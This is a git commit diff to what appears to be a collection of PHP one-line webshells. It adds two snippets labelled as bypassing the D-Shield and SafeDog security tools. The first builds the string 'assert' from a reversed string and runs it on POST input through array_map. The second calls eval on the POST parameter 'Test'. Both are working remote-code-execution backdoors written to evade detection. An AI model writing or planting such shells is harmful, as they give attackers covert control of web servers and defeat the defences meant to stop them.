230beed4c9a69542fd8d124779d281ba0dda5d44
Test404 <XebZec@yeah.net>
2016-09-19 23:27:36 +0800

    Update PHP一句话收集.php

--- php/PHP一句话收集.php
+++ php/PHP一句话收集.php
@@ -111,4 +111,24 @@ $fun($a);
 //密码TestClass
 
 /*--------------------------------------------------------------------------------*/ 
+过D盾过安全狗
+ 
+<?php
+error_reporting(0);
+$b="zxczxczxczxczxcxzczx";
+function  yuag_array($b,$c){
+$b=strrev($b);
+print "www.baidu.com";
+array_map(substr_replace($b, 'ss', 1, 0),array($c));
+}
+yuag_array("trea",$_POST['Test']);
 
+
+<?php
+$a ="www.baidu.com";
+function yuag($a){
+eval($a);
+}
+@
+yuag($_POST['Test']);
+/*--------------------------------------------------------------------------------*/ 
